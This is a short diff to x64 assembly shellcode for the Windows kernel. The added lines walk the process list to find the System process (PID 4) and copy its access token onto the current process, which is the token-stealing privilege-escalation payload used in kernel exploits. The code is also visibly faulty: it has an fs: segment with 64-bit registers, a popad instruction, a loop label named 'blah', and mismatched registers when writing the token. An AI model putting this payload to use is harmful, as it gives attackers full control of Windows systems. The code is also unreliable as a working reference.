@@ -20,8 +20,19 @@ _start :
   ;If explore further more on _KAPC_STATE structure we can find a pointer to the current process structure at offset 0x10, ‘Process’ which is of _KPROCESS structure. 
   ;The KPROCESS structure is embedded inside the EPROCESS structure and it contains scheduling related information like threads, quantum, priority and execution times. This is done in the shellcode as
   
-  mov r11 , fs:[r11+0x50]
+  mov r12 , fs:[r11+0x50]
   
   ; find system process steal token 
   
-  cmp dword [r11+0x]
+  blah:
+  ; traverse the double linked list and find the process ID of 0x4.
+    mov r12, [r12 + 0x0B8] ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
+	  sub r12, 0x0B8
+	  cmp [r12 + 0x0B4], 0x4 ; Get nt!_EPROCESS.UniqueProcessId
+	  jne blah
+
+  ;Once we find the ‘System’ process we replace our current process’s token with the token value of the ‘System’ process. The offset of ‘Token’ is at 0xf8
+  mov r12, [r12 + 0x0F8] ; Get SYSTEM process nt!_EPROCESS.Token  
+  mov [r11 + 0x0F8], r12 ; Replace our current token to SYSTEM
+  popad
+   
